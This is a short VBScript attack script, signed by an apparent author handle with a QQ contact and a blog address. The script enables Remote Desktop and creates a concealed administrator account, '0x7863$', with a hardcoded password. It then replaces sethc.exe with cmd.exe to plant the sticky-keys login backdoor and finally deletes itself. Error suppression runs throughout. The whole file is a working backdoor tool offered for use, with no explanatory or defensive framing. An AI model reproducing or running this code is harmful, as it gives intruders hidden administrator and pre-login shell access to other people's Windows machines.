on error resume next
const HKEY_LOCAL_MACHINE = &H80000002
strComputer = "."
Set StdOut = WScript.StdOut
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_ 
strComputer & "\root\default:StdRegProv")
strKeyPath = "SYSTEM\CurrentControlSet\Control\Terminal Server"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
strKeyPath = "SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp"
oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
strKeyPath = "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
strKeyPath = "SYSTEM\CurrentControlSet\Control\Terminal Server"
strValueName = "fDenyTSConnections"
dwValue = 0
oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
strKeyPath = "SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp"
strValueName = "PortNumber"
dwValue = 3389
oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
strKeyPath = "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
strValueName = "PortNumber"
dwValue = 3389
oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue
on error resume next
dim username,password:If Wscript.Arguments.Count  Then:username=Wscript.Arguments(0):password=Wscript.Arguments(1):Else:username="0x7863$":password="3253220":end if:set wsnetwork=CreateObject("WSCRIPT.NETWORK"):os="WinNT://"&wsnetwork.ComputerName:Set ob=GetObject(os):Set oe=GetObject(os&"/Administrators,group"):Set od=ob.Create("user",username):od.SetPassword password:od.SetInfo:Set of=GetObject(os&"/"&username&",user"):oe.Add(of.ADsPath)'wscript.echo of.ADsPath
On Error Resume Next
Dim obj, success
Set obj = CreateObject("WScript.Shell")
success = obj.run("cmd /c takeown /f %SystemRoot%\system32\sethc.exe&echo y| cacls %SystemRoot%\system32\sethc.exe /G %USERNAME%:F&copy %SystemRoot%\system32\cmd.exe %SystemRoot%\system32\acmd.exe&copy %SystemRoot%\system32\sethc.exe %SystemRoot%\system32\asethc.exe&del %SystemRoot%\system32\sethc.exe&ren %SystemRoot%\system32\acmd.exe sethc.exe", 0, True)
CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName)

BY:c32 QQȺ:43910940  

BLOG:www.19aq.com